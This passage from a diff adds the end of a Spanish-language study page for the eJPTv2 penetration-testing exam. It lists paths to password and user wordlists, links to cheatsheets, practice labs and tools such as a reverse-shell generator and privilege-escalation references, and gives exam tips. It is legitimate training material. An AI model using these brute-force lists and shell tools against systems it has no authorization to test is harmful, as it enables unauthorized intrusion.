+/usr/share/wordlists/metasploit/unix_passwords.txt        <span class="comment"># Passwords unix comunes</span>
+/usr/share/wordlists/metasploit/common_users.txt          <span class="comment"># Usuarios comunes</span>
+/usr/share/wordlists/metasploit/unix_users.txt
+/usr/share/wordlists/dirb/common.txt                      <span class="comment"># Directorios web comunes</span>
+/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  <span class="comment"># Dirs más completo</span>
+/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt  <span class="comment"># Subdominios</span>
+/usr/share/metasploit-framework/data/wordlists/            <span class="comment"># Wordlists de MSF</span></code></pre>
+  </div>
+</section>
+
+<hr>
+
+<!-- RECURSOS -->
+<section id="recursos" class="phase">
+  <div class="phase-header">
+    <span class="phase-icon">📚</span>
+    <div>
+      <div class="phase-title">Recursos para prepararte</div>
+      <div class="phase-subtitle">Curados de personas que aprobaron el eJPTv2</div>
+    </div>
+  </div>
+
+  <div class="resources">
+    <div class="resource-card">
+      <h4>🎯 GitHub — Notas comunitarias</h4>
+      <a href="https://github.com/dev-angelist/eJPTv2-Notes" target="_blank">dev-angelist/eJPTv2-Notes ⭐</a>
+      <a href="https://github.com/HackersParadisee/eJPTv2-Cheatsheet" target="_blank">HackersParadisee/eJPTv2-Cheatsheet</a>
+      <a href="https://github.com/iabdullah215/eJPT-CheatSheet" target="_blank">iabdullah215/eJPT-CheatSheet</a>
+      <a href="https://blog.syselement.com/ine/courses/ejpt/ejpt-cheatsheet" target="_blank">syselement — Cheatsheet completo PDF ⭐</a>
+    </div>
+    <div class="resource-card">
+      <h4>📖 Blogs y Reviews</h4>
+      <a href="https://nmmorette.github.io/posts/2023/12/ejptv2-cheat-sheet/" target="_blank">nmmorette — eJPTv2 Cheatsheet</a>
+      <a href="https://methodological-notes.gitbook.io/ejptv2-preparation" target="_blank">ejPTv2 Preparation GitBook</a>
+      <a href="https://infosecwriteups.com/conquering-the-ejptv2-exam-my-journey-302722832868" target="_blank">Abdul Issa — My Journey (passed!)</a>
+    </div>
+    <div class="resource-card">
+      <h4>🧪 Práctica CTFs</h4>
+      <a href="https://tryhackme.com/room/vulnversity" target="_blank">TryHackMe — Vulnversity</a>
+      <a href="https://tryhackme.com/room/relevant" target="_blank">TryHackMe — Relevant</a>
+      <a href="https://tryhackme.com/room/bruteit" target="_blank">TryHackMe — Brute It</a>
+      <a href="https://tryhackme.com/room/linuxprivesc" target="_blank">TryHackMe — Linux PrivEsc</a>
+      <a href="https://tryhackme.com/room/windows10privesc" target="_blank">TryHackMe — Windows PrivEsc</a>
+    </div>
+    <div class="resource-card">
+      <h4>🛠️ Herramientas online</h4>
+      <a href="https://www.revshells.com/" target="_blank">RevShells.com — Generador de shells</a>
+      <a href="https://gchq.github.io/CyberChef/" target="_blank">CyberChef — Encode/Decode</a>
+      <a href="https://gtfobins.github.io/" target="_blank">GTFOBins — PrivEsc Linux</a>
+      <a href="https://lolbas-project.github.io/" target="_blank">LOLBAS — PrivEsc Windows</a>
+      <a href="https://crackstation.net/" target="_blank">CrackStation — Hash cracking online</a>
+      <a href="https://book.hacktricks.xyz" target="_blank">HackTricks — Referencia completa</a>
+    </div>
+  </div>
+</section>
+
+<!-- QUICK REFERENCE -->
+<div class="tip" style="margin-top:32px;font-size:13px;">
+  <strong>🏆 Consejos de aprobados del eJPTv2:</strong><br><br>
+  1. <strong>Haz TODOS los labs del curso PTSv2 (INE)</strong> — El examen es muy similar a los labs.<br>
+  2. <strong>Ten tu propio cheatsheet listo</strong> — El examen es open-book, puedes consultarlo.<br>
+  3. <strong>Siempre escanea los 65535 puertos</strong> (<code>-p-</code>) — No solo los 1000 por defecto.<br>
+  4. <strong>Revisa /etc/hosts y rutas</strong> al entrar — Hay redes ocultas en el examen.<br>
+  5. <strong>Documenta todo</strong> — Screenshots, IPs, credentials, flags mientras avanzas.<br>
+  6. <strong>Tienes 48 horas</strong> — No te estreses, hay tiempo. Descansa si te bloqueas.
+</div>
+
+</div><!-- /container -->
+
+<script>
+function copyPre(btn) {
+  const pre = btn.parentElement;
+  const code = pre.querySelector('code');
+  const text = code.innerText;
+  navigator.clipboard.writeText(text).then(() => {
+    btn.textContent = '✓ Copied';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+  });
+}
+
+// Smooth scroll
+document.querySelectorAll('a[href^="#"]').forEach(a => {
+  a.addEventListener('click', e => {
+    e.preventDefault();
+    document.querySelector(a.getAttribute('href'))?.scrollIntoView({ behavior: 'smooth', block: 'start' });
+  });
+});
+</script>
+
+</body>
+</html>
